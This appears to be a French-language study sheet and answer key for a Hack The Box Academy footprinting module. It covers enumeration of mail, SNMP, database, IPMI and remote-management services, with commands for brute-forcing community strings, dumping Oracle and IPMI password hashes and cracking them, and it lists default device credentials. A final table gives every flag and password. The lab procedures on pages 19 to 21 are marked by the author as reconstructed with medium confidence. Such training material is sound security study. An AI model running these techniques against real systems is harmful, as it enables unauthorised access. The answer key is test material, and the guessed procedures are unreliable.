🔑 Settings dangereux Dovecot : `auth_debug_passwords` et `auth_verbose_passwords` journalisent les mots de passe en clair dans les logs.

## ⌨️ Commandes importantes

```bash
# Nmap
sudo nmap IP_CIBLE -sV -p110,143,993,995 -sC

# cURL avec credentials
curl -k 'imaps://IP_CIBLE' --user user:password

# OpenSSL (TLS)
openssl s_client -connect IP_CIBLE:imaps
openssl s_client -connect IP_CIBLE:pop3s
```

## ✅ Questions de la page 11

### ❓ Question 1 — Nom de l'organisation

| | |
|---|---|
| **Question (EN)** | Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer. |
| **Réponse à mettre sur HTB** | `InlaneFreight Ltd` |

**🧭 Procédure complète**

```bash
openssl s_client -connect IP_CIBLE:imaps
```
Lis le champ `O=` (organizationName) du certificat affiché dans `Server certificate` / `subject:`.

---

### ❓ Question 2 — FQDN d'IMAP/POP3

| | |
|---|---|
| **Question (EN)** | What is the FQDN that the IMAP and POP3 servers are assigned to? |
| **Réponse à mettre sur HTB** | `dev.inlanefreight.htb` |

**🧭 Procédure complète**

Dans le même certificat (`openssl s_client -connect IP_CIBLE:imaps`), lis le champ `CN=` (commonName).

---

### ❓ Question 3 — Flag IMAP

| | |
|---|---|
| **Question (EN)** | Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...}) |
| **Réponse à mettre sur HTB** | `HTB{roncfbw7iszerd7shni7jr2343zhrj}` |

**🧭 Procédure complète**

```bash
curl -k 'imaps://IP_CIBLE' --user anonymous:anonymous -v
```
⚠️ Si l'accès anonyme ne fonctionne pas, le flag peut être visible directement dans la **bannière de connexion** (`* OK [CAPABILITY ...] HTB-Academy IMAP4 v...`) ou nécessiter les creds trouvés en page SMTP (`robin:robin`, voir Q de la page 10). Teste :
```bash
curl -k 'imaps://IP_CIBLE' --user robin:robin -v
```

---

### ❓ Question 4 — Version personnalisée POP3

| | |
|---|---|
| **Question (EN)** | What is the customized version of the POP3 server? |
| **Réponse à mettre sur HTB** | `InFreight POP3 v9.188` |

**🧭 Procédure complète**

```bash
openssl s_client -connect IP_CIBLE:pop3s
```
Lis la ligne de bannière après la négociation TLS (`+OK ...`).

---

### ❓ Question 5 — Email de l'admin

| | |
|---|---|
| **Question (EN)** | What is the admin email address? |
| **Réponse à mettre sur HTB** | `devadmin@inlanefreight.htb` |

**🧭 Procédure complète**

Lis le champ `emailAddress=` du certificat SSL (`openssl s_client -connect IP_CIBLE:imaps`), dans le `subject:`.

---

### ❓ Question 6 — Accès aux emails sur IMAP

| | |
|---|---|
| **Question (EN)** | Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...}) |
| **Réponse à mettre sur HTB** | `HTB{983uzn8jmfgpd8jmof8c34n7zio}` |

**🧭 Procédure complète**

Utilise les credentials trouvés en page SMTP (`robin:robin`, user `robin` trouvé via VRFY) :
```bash
curl -k 'imaps://IP_CIBLE' --user robin:robin
```
Liste les dossiers, puis consulte le contenu des messages (via un client comme `curl` avec `FETCH`, ou un client mail léger type `mutt`/`neomutt` configuré sur IMAPS) pour trouver le flag dans le corps d'un email.

✔️ **Plan B** : `openssl s_client -connect IP_CIBLE:imaps` puis taper manuellement :
```
a LOGIN robin robin
a LIST "" *
a SELECT INBOX
a FETCH 1:* BODY[TEXT]
```

---

# Page 12 — SNMP

## 📘 Résumé

**SNMP** (UDP **161** infos, UDP **162** traps) monitore/configure des équipements réseau.

| Version | Sécurité |
|---|---|
| SNMPv1 | Aucune authentification, pas de chiffrement |
| SNMPv2c | Community string en clair |
| SNMPv3 | Authentification + chiffrement (pre-shared key) |

🔑 **Community string** = mot de passe transmis **en clair**. `public` = lecture seule par défaut. Les settings `rwuser noauth` ou `rwcommunity` sans restriction donnent un accès complet au MIB sans authentification.

🔑 **MIB/OID** : chaque objet interrogeable a un identifiant unique (OID) en notation pointée (ex. `.1.3.6.1.2.1.1.1.0`).

## ⌨️ Commandes importantes

```bash
# Interroger tout l'arbre MIB avec une community string connue
snmpwalk -v2c -c public IP_CIBLE

# Brute-forcer la community string
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt IP_CIBLE

# Brute-forcer les OID avec une community connue
braa public@IP_CIBLE:.1.3.6.*
```

## ✅ Questions de la page 12

### ❓ Question 1 — Email de l'admin

| | |
|---|---|
| **Question (EN)** | Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer. |
| **Réponse à mettre sur HTB** | `devadmin@inlanefreight.htb` |

**🧭 Procédure complète**

```bash
snmpwalk -v2c -c public IP_CIBLE
```
Cherche l'OID `iso.3.6.1.2.1.1.4.0` (`sysContact`) — contient l'email de l'administrateur.

---

### ❓ Question 2 — Version personnalisée SNMP

| | |
|---|---|
| **Question (EN)** | What is the customized version of the SNMP server? |
| **Réponse à mettre sur HTB** | `InFreight SNMP v0.91` |

**🧭 Procédure complète**

```bash
snmpwalk -v2c -c public IP_CIBLE
```
Cherche l'OID `iso.3.6.1.2.1.1.1.0` (`sysDescr`) — contient la description personnalisée du système.

---

### ❓ Question 3 — Script custom / flag

| | |
|---|---|
| **Question (EN)** | Enumerate the custom script that is running on the system and submit its output as the answer. |
| **Réponse à mettre sur HTB** | `HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}` |

**🧭 Procédure complète**

```bash
snmpwalk -v2c -c public IP_CIBLE
```
Parcours la sortie complète (très longue, liste de paquets installés `iso.3.6.1.2.1.25.6.3.1.2.*`) et cherche une entrée qui ressemble à un **script personnalisé** (nom inhabituel, pas un paquet Ubuntu standard) dont la sortie contient `HTB{...}`.

✔️ **Plan B** : filtre la sortie pour isoler les chaînes suspectes :
```bash
snmpwalk -v2c -c public IP_CIBLE | grep -i "HTB{"
```

---

# Page 13 — MySQL

## 📘 Résumé

**MySQL** (port **3306**) = SGBD relationnel open-source. **MariaDB** = fork compatible.

### Settings dangereux

| Setting | Risque |
|---|---|
| `user` / `password` en clair dans la config | Si lisible → accès direct à la DB |
| `admin_address` | Interface d'administration exposée |
| `debug` / `sql_warnings` | Fuite d'informations verbeuses en cas d'erreur |

## ⌨️ Commandes importantes

```bash
# Nmap avec scripts MySQL
sudo nmap IP_CIBLE -sV -sC -p3306 --script mysql*

# Connexion
mysql -u root -h IP_CIBLE
mysql -u root -pMOTDEPASSE -h IP_CIBLE

# Une fois connecté
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";
```

## ✅ Questions de la page 13

### ❓ Question 1 — Version MySQL

| | |
|---|---|
| **Question (EN)** | Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX) |
| **Réponse à mettre sur HTB** | `MySQL 8.0.27` |

**🧭 Procédure complète**

```bash
sudo nmap IP_CIBLE -sV -sC -p3306 --script mysql-info
```
Le champ `Version:` de la sortie `mysql-info` donne la version exacte.

✔️ **Plan B** : si connecté, `SELECT version();` donne aussi la réponse.

---

### ❓ Question 2 — Email du client "Otto Lang"

| | |
|---|---|
| **Question (EN)** | During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"? |
| **Réponse à mettre sur HTB** | `ultrices@google.htb` |

**🧭 Procédure complète**

```bash
mysql -u robin -probin -h IP_CIBLE
show databases;
use <database_clients>;   # repère la base qui contient des clients/customers
show tables;
select * from <table_customers> where name = "Otto Lang";
```
⚠️ Le nom exact de la base et de la table n'est pas donné dans le cours — explore avec `show databases;` puis `show tables;` jusqu'à trouver une table contenant des colonnes type `name`/`email`.

---

# Page 14 — MSSQL

## 📘 Résumé

**MSSQL** (Microsoft SQL Server, port **1433**) = SGBD propriétaire Microsoft, fort lien avec .NET et Active Directory.

### Bases système par défaut

| Base | Rôle |
|---|---|
| `master` | Infos système de l'instance |
| `model` | Template pour toute nouvelle base |
| `msdb` | Jobs/alertes du SQL Server Agent |
| `tempdb` | Objets temporaires |
| `resource` | Objets système en lecture seule |

🔑 Authentification par défaut = **Windows Authentication** (via SAM local ou AD). Client recommandé en pentest : **Impacket `mssqlclient.py`**.

## ⌨️ Commandes importantes

```bash
# Nmap scripts MSSQL
sudo nmap --script ms-sql-info,ms-sql-ntlm-info -sV -p1433 IP_CIBLE

# Metasploit
use auxiliary/scanner/mssql/mssql_ping
set rhosts IP_CIBLE
run

# Connexion avec Impacket
python3 mssqlclient.py Administrator@IP_CIBLE -windows-auth
python3 mssqlclient.py user:password@IP_CIBLE   # SQL authentication

# Une fois connecté
SQL> select name from sys.databases
```

## ✅ Questions de la page 14

### ❓ Question 1 — Hostname du serveur MSSQL

| | |
|---|---|
| **Question (EN)** | Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server. |
| **Réponse à mettre sur HTB** | `ILF-SQL-01` |

**🧭 Procédure complète**

```bash
sudo nmap --script ms-sql-info -sV -p1433 IP_CIBLE
```
Le champ `Windows server name:` de la sortie `ms-sql-info` donne le hostname.

---

### ❓ Question 2 — Base de données non-par-défaut

| | |
|---|---|
| **Question (EN)** | Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server. |
| **Réponse à mettre sur HTB** | `Employees` |

**🧭 Procédure complète**

```bash
python3 mssqlclient.py backdoor:Password1@IP_CIBLE
SQL> select name from sys.databases
```
Compare la liste obtenue aux 4 bases par défaut (`master`, `tempdb`, `model`, `msdb`) : celle en plus est la réponse (`Employees`).

---

# Page 15 — Oracle TNS

## 📘 Résumé

**Oracle TNS** (port **1521**) facilite la communication entre bases Oracle et applications.

🔑 Mots de passe par défaut : Oracle 9 → `CHANGE_ON_INSTALL`. Service **DBSNMP** → mot de passe par défaut `dbsnmp`.

Fichiers de config : `tnsnames.ora` (côté client, résout un nom de service vers une adresse réseau) et `listener.ora` (côté serveur, définit ce que le listener écoute).

**SID** (System Identifier) : identifie une instance de base de données précise.

## ⌨️ Commandes importantes

```bash
# Nmap
sudo nmap -p1521 -sV IP_CIBLE --open

# Brute force de SID
sudo nmap -p1521 -sV IP_CIBLE --open --script oracle-sid-brute

# ODAT (Oracle Database Attacking Tool) - tout tester
./odat.py all -s IP_CIBLE

# Connexion SQLplus
sqlplus scott/tiger@IP_CIBLE/XE
sqlplus scott/tiger@IP_CIBLE/XE as sysdba

# Extraction des hashs de mot de passe (une fois sysdba)
SQL> select name, password from sys.user$;
```

## ✅ Questions de la page 15

### ❓ Question 1 — Hash du mot de passe DBSNMP

| | |
|---|---|
| **Question (EN)** | Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer. |
| **Réponse à mettre sur HTB** | `E066D214D5421CCC` |

**🧭 Procédure complète**

**Partie 1 : accès à la base**
```bash
./odat.py all -s IP_CIBLE
```
Note les credentials valides trouvés (ex. `scott/tiger`), puis :
```bash
sqlplus scott/tiger@IP_CIBLE/XE as sysdba
```

**Partie 2 : extraction du hash**
```sql
SQL> select name, password from sys.user$;
```
Repère la ligne `DBSNMP` dans la colonne `NAME`, le hash est dans `PASSWORD`.

**Partie 3 : validation** — Recopie le hash exactement (majuscules comprises) → **Submit**.

---

# Page 16 — IPMI

## 📘 Résumé

**IPMI** (UDP **623**) permet la gestion matérielle à distance (BMC — Baseboard Management Controller), indépendamment de l'OS. Même machine éteinte, accessible si alimentée et connectée au réseau.

🔑 **Mots de passe par défaut connus** :

| Produit | User | Password |
|---|---|---|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | chaîne 8 caractères aléatoire (souvent imprimée sur l'étiquette) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

⚠️ **Faille RAKP (IPMI 2.0)** : le serveur envoie un hash salé (SHA1/MD5) du mot de passe **avant** authentification complète → récupérable et crackable offline (Hashcat mode **7300**).

## ⌨️ Commandes importantes

```bash
# Nmap : version IPMI
sudo nmap -sU --script ipmi-version -p 623 IP_CIBLE

# Metasploit : version
use auxiliary/scanner/ipmi/ipmi_version
set rhosts IP_CIBLE
run

# Metasploit : dump des hashs (+ crack automatique des mots de passe communs)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts IP_CIBLE
run

# Crack offline avec Hashcat (mode 7300)
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

## ✅ Questions de la page 16

### ❓ Question 1 — Username IPMI

| | |
|---|---|
| **Question (EN)** | What username is configured for accessing the host via IPMI? |
| **Réponse à mettre sur HTB** | `admin` |

**🧭 Procédure complète**

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts IP_CIBLE
run
```
La sortie `Hash found: <USERNAME>:...` donne le nom d'utilisateur configuré.

---

### ❓ Question 2 — Mot de passe en clair

| | |
|---|---|
| **Question (EN)** | What is the account's cleartext password? |
| **Réponse à mettre sur HTB** | `trinity` |

**🧭 Procédure complète**

1. Récupère le hash avec `ipmi_dumphashes` (voir Q1). Si `CRACK_COMMON` est à `true` (par défaut), Metasploit tente déjà un crack avec la wordlist `ipmi_passwords.txt` et affiche directement `Hash for user '<user>' matches password '<password>'`.
2. Si rien n'est trouvé automatiquement, exporte le hash au format Hashcat (`OUTPUT_HASHCAT_FILE`) et lance un crack manuel :
   ```bash
   hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
   ```

**Partie 2 : validation** — Soumets le mot de passe trouvé (`trinity`).

---

# Page 17 — Linux Remote Management Protocols

## 📘 Résumé

### SSH (port 22)
Chiffré, 6 méthodes d'authentification (password, public-key, host-based, keyboard, challenge-response, GSSAPI). **Public-key auth** : le serveur envoie sa clé publique (vérification d'identité), puis le client prouve l'accès via un problème cryptographique résolu avec sa clé privée.

**Settings dangereux `sshd_config`** :

| Setting | Risque |
|---|---|
| `PasswordAuthentication yes` | Permet le brute-force de mot de passe |
| `PermitEmptyPasswords yes` | Mots de passe vides acceptés |
| `PermitRootLogin yes` | Connexion root directe |
| `Protocol 1` | Chiffrement obsolète, vulnérable MITM |
| `X11Forwarding yes` | Vulnérabilité d'injection de commande connue (CVE OpenSSH 7.2p1, 2016) |

### Rsync (port 873)
Copie de fichiers efficace (algorithme delta-transfer). Peut être accessible **sans authentification**.

### R-Services (ports 512/513/514)
Suite obsolète (`rcp`, `rsh`, `rexec`, `rlogin`) — transmission en clair, authentification basée sur la confiance (`/etc/hosts.equiv` et `~/.rhosts`). Le caractère `+` dans ces fichiers = wildcard (n'importe quel hôte/utilisateur).

## ⌨️ Commandes importantes

```bash
# Audit de configuration SSH
./ssh-audit.py IP_CIBLE

# Forcer l'authentification par mot de passe (test brute-force potentiel)
ssh -v user@IP_CIBLE -o PreferredAuthentications=password

# Rsync : lister les shares
nc -nv IP_CIBLE 873
rsync -av --list-only rsync://IP_CIBLE/dev
rsync -av rsync://IP_CIBLE/dev   # télécharger tout le share

# R-Services : connexion
rlogin IP_CIBLE -l htb-student
rwho
rusers -al IP_CIBLE
```

## ✅ Questions de la page 17

> Cette page ne contient pas de question notée (contenu théorique ; le lab pratique est traité en page 18/19-21).

---

# Page 18 — Windows Remote Management Protocols

## 📘 Résumé

### RDP (port 3389)
Bureau à distance graphique chiffré TLS/SSL (depuis Vista). Certificats souvent **auto-signés** par défaut → pas de vérification fiable de l'identité du serveur.

### WinRM (ports 5985 HTTP / 5986 HTTPS)
Gestion en ligne de commande via SOAP. Activé par défaut depuis Windows Server 2012. Outil clé côté Linux : **Evil-WinRM**.

### WMI (port 135, puis port aléatoire)
Accès en lecture/écriture à presque tous les paramètres Windows. Outil clé : **Impacket `wmiexec.py`**.

## ⌨️ Commandes importantes

```bash
# Nmap RDP
nmap -sV -sC IP_CIBLE -p3389 --script rdp*

# Connexion RDP (Linux)
xfreerdp /u:USER /p:"PASSWORD" /v:IP_CIBLE

# Nmap WinRM
nmap -sV -sC IP_CIBLE -p5985,5986

# Connexion WinRM
evil-winrm -i IP_CIBLE -u USER -p PASSWORD

# Exécution de commande via WMI (Impacket)
wmiexec.py USER:"PASSWORD"@IP_CIBLE "hostname"
```

## ✅ Questions de la page 18

> Cette page ne contient pas de question notée (le lab pratique arrive en pages 19-21).

---

# Page 19 — Footprinting Lab : Easy

## 📘 Contexte
Serveur **DNS interne** d'Inlanefreight Ltd. Interdiction d'exploiter agressivement (environnement de production). Credentials fournis par l'équipe : `ceil:qwer1234`. Indice : des employés parlent de clés SSH sur un forum.

## ✅ Question

### ❓ Question 1 — flag.txt sur le serveur

| | |
|---|---|
| **Question (EN)** | Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer. |
| **Réponse à mettre sur HTB** | `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target**, note `IP_CIBLE`.
2. Pwnbox ou VPN (voir bloc de connexion général en tête de fiche).

**Partie 1 : la recherche** ⚠️ *méthode reconstituée à partir de l'énoncé (DNS + credentials + indice SSH), confiance moyenne*

1. Scan complet des ports pour identifier tous les services :
   ```bash
   sudo nmap -p- -sV -sC IP_CIBLE
   ```
2. Vu le contexte « serveur DNS interne », commence par DNS (port 53) :
   ```bash
   dig any inlanefreight.htb @IP_CIBLE
   dig axfr inlanefreight.htb @IP_CIBLE
   ```
3. Si un service SSH (port 22) est ouvert, utilise les credentials fournis :
   ```bash
   ssh ceil@IP_CIBLE
   # mot de passe : qwer1234
   ```
4. Une fois connecté (ou via un autre service type FTP/SMB trouvé par le scan), cherche le fichier :
   ```bash
   find / -iname "flag.txt" 2>/dev/null
   cat /chemin/trouvé/flag.txt
   ```
5. Si l'indice "clés SSH sur un forum" est pertinent, cherche aussi une clé privée exposée via un autre service découvert (FTP/SMB/NFS anonyme) et utilise-la pour du `ssh -i cle_privee user@IP_CIBLE`.

✔️ **Plan B** : si `ceil:qwer1234` ne fonctionne nulle part directement, utilise-le comme point de départ pour énumérer d'autres services (FTP, SMB) qui pourraient accepter les mêmes identifiants (réutilisation de mot de passe).

**Partie 2 : validation**

6. Colle le contenu exact du flag → **Submit**.

---

# Page 20 — Footprinting Lab : Medium

## 📘 Contexte
Serveur accessible à **tout le réseau interne**. Un utilisateur **HTB** a été créé pour la preuve — objectif : récupérer son mot de passe.

## ✅ Question

### ❓ Question 1 — Mot de passe de l'utilisateur HTB

| | |
|---|---|
| **Question (EN)** | Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer. |
| **Réponse à mettre sur HTB** | `lnch7ehrdn43i7AoqVPK4zWR` |

**🧭 Procédure complète**

**Partie 0 : connexion** — Spawn Target, Pwnbox/VPN.

**Partie 1 : la recherche** ⚠️ *méthode reconstituée, confiance moyenne*

1. Scan complet des ports (serveur « accessible à tous » suggère un service largement ouvert type SMB, FTP ou web) :
   ```bash
   sudo nmap -p- -sV -sC IP_CIBLE
   ```
2. Si SMB est présent, cherche un accès anonyme et le username `HTB` :
   ```bash
   smbclient -N -L //IP_CIBLE
   smbclient -N //IP_CIBLE/<share_trouvé>
   ```
   Cherche un fichier de config/credentials (`.txt`, `.xml`, `.config`) contenant `HTB` et son mot de passe.
3. Si FTP est présent, vérifie l'accès anonyme :
   ```bash
   ftp IP_CIBLE
   # anonymous / (vide)
   ```
4. Une fois un fichier de credentials trouvé, le mot de passe de HTB est directement dedans (`username: HTB` / `password: ...`).

✔️ **Plan B** : utilise `enum4linux-ng.py IP_CIBLE -A` pour une énumération SMB complète en un coup, qui peut révéler l'utilisateur `HTB` via RPC (`enumdomusers`) si le service est SMB/Samba.

**Partie 2 : validation**

5. Soumets uniquement le **mot de passe** (pas le username) → **Submit**.

---

# Page 21 — Footprinting Lab : Hard

## 📘 Contexte
Serveur **MX et de management** interne, fait aussi office de serveur de **backup des comptes du domaine**. Utilisateur `HTB` créé, objectif : récupérer son mot de passe.

## ✅ Question

### ❓ Question 1 — Mot de passe de l'utilisateur HTB

| | |
|---|---|
| **Question (EN)** | Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer. |
| **Réponse à mettre sur HTB** | `cr3n4o7rzse7rzhnckhssncif7ds` |

**🧭 Procédure complète**

**Partie 0 : connexion** — Spawn Target, Pwnbox/VPN.

**Partie 1 : la recherche** ⚠️ *méthode reconstituée, confiance moyenne*

1. Scan complet des ports (serveur « MX » suggère SMTP/IMAP/POP3 ; « backup des comptes du domaine » suggère un accès fichiers type SMB/NFS/FTP contenant une sauvegarde) :
   ```bash
   sudo nmap -p- -sV -sC IP_CIBLE
   ```
2. Vérifie les services mail pour des informations sur l'organisation et des usernames (VRFY sur SMTP, cf. page 10) :
   ```bash
   telnet IP_CIBLE 25
   VRFY HTB
   ```
3. Cherche un service de partage de fichiers (SMB/FTP/NFS) qui pourrait contenir un **fichier de sauvegarde** (type `.bak`, `ntds.dit`, export de base SAM, fichier `.csv`/`.txt` de comptes) :
   ```bash
   smbclient -N -L //IP_CIBLE
   showmount -e IP_CIBLE
   ftp IP_CIBLE
   ```
4. Télécharge et inspecte tout fichier de sauvegarde trouvé pour y repérer le compte `HTB` et son mot de passe en clair ou un hash à cracker.

✔️ **Plan B** : si un hash est trouvé plutôt qu'un mot de passe en clair, utilise Hashcat/John avec une wordlist (ex. `rockyou.txt`) adaptée au type de hash identifié (`hashid` pour le reconnaître).

**Partie 2 : validation**

5. Soumets uniquement le **mot de passe** → **Submit**.

---

# Mémo final — toutes les réponses HTB

| Page | Service / Question | **Réponse à mettre sur HTB** |
|---|---|---|
| 6 | FTP — bannière version | `InFreight FTP v1.1` |
| 6 | FTP — flag.txt | `HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}` |
| 7 | SMB — version serveur | `Samba smbd 4.6.2` |
| 7 | SMB — nom du share | `sambashare` |
| 7 | SMB — flag.txt | `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}` |
| 7 | SMB — domaine | `DEVOPS` |
| 7 | SMB — version custom du share | `InFreight SMB v3.1` |
| 7 | SMB — chemin complet du share | `/home/sambauser` |
| 8 | NFS — flag.txt (share "nfs") | `HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}` |
| 8 | NFS — flag.txt (share "nfsshare") | `HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}` |
| 9 | DNS — FQDN inlanefreight.htb | `ns.inlanefreight.htb` |
| 9 | DNS — zone transfer TXT | `HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}` |
| 9 | DNS — IP de DC1 | `10.129.34.16` |
| 9 | DNS — FQDN se terminant par .203 | `win2k.dev.inlanefreight.htb` |
| 10 | SMTP — bannière | `InFreight ESMTP v2.11` |
| 10 | SMTP — username trouvé | `robin` |
| 11 | IMAP/POP3 — organisation | `InlaneFreight Ltd` |
| 11 | IMAP/POP3 — FQDN | `dev.inlanefreight.htb` |
| 11 | IMAP — flag | `HTB{roncfbw7iszerd7shni7jr2343zhrj}` |
| 11 | POP3 — version custom | `InFreight POP3 v9.188` |
| 11 | IMAP/POP3 — email admin | `devadmin@inlanefreight.htb` |
| 11 | IMAP — flag emails | `HTB{983uzn8jmfgpd8jmof8c34n7zio}` |
| 12 | SNMP — email admin | `devadmin@inlanefreight.htb` |
| 12 | SNMP — version custom | `InFreight SNMP v0.91` |
| 12 | SNMP — flag script custom | `HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}` |
| 13 | MySQL — version | `MySQL 8.0.27` |
| 13 | MySQL — email Otto Lang | `ultrices@google.htb` |
| 14 | MSSQL — hostname | `ILF-SQL-01` |
| 14 | MSSQL — base non-défaut | `Employees` |
| 15 | Oracle TNS — hash DBSNMP | `E066D214D5421CCC` |
| 16 | IPMI — username | `admin` |
| 16 | IPMI — mot de passe | `trinity` |
| 19 | Lab Easy — flag.txt | `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}` |
| 20 | Lab Medium — mot de passe HTB | `lnch7ehrdn43i7AoqVPK4zWR` |
| 21 | Lab Hard — mot de passe HTB | `cr3n4o7rzse7rzhnckhssncif7ds` |
